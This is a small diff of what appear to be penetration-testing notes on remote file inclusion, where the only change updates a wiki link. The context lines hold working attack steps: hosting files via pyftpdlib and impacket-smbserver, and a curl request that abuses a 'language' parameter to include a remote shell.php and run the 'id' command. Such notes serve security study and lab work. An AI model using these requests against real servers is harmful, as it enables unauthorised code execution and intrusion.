@@ -91,7 +91,7 @@ sudo python -m pyftpdlib -p 21
 curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
 ```
 
-host via smb [[SMB]]
+host via smb [[Pentest/Enumeration/services/SMB]]
 ```bash
 impacket-smbserver -smb2support share $(pwd)
 ```
